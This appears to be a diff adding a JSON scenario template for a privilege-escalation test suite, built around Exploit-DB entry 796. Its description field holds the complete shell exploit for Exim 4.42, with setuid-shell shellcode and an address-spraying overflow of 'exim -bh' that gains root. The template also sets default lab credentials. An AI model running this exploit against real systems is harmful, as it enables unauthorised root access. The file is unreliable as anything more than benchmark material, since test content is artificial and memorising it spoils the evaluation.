@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_796",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Exim 4.42 - Local Privilege Escalation\n\nExploit source code (796.sh):\n```\n#!/bin/sh\n\n# Local Lame R00T sploit for exim <= 4.42\n# by Dark Eagle\n#\n# My First Coding Release In bash ))\n\n# Unl0ck Research Team\n#\n# More Effective than C-code.\n#\n# @env.c content:\n#\n###################################################\n#  #include <stdio.h>\n#  #include <string.h>\n#  int main(int argc, char *argv[])\n#  {\n#  char *addr_ptr;\n#  addr_ptr = getenv(argv[1]);\n#  printf(\"%s @ %p\\n\", argv[1], addr_ptr);\n#  return 0;\n#  }\n###################################################\n\ngcc @env.c -o @env\n\ncp @env /usr/bin\ncd /usr/exim/bin\n\nCODE=`perl -e 'print \"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\n\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\"'`;export CODE\n\n@env CODE\necho \"So, dude, starting...\"\necho \"NoW Just Type Address Of CODE\"\n\nread ADDRESS\n\necho \"You are typed: $ADDRESS\"\n\necho \"Leeeeeeeeeeeeet'sssssssssss g000000000000000!!!!!!!!!\"\n\n./exim -bh ::%A`perl -e 'print pack('L','$ADDRESS') x 256'`\n\n# milw0rm.com [2005-02-07]\n```",
+  "cve": "",
+  "exploitdb_id": "796",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_796",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
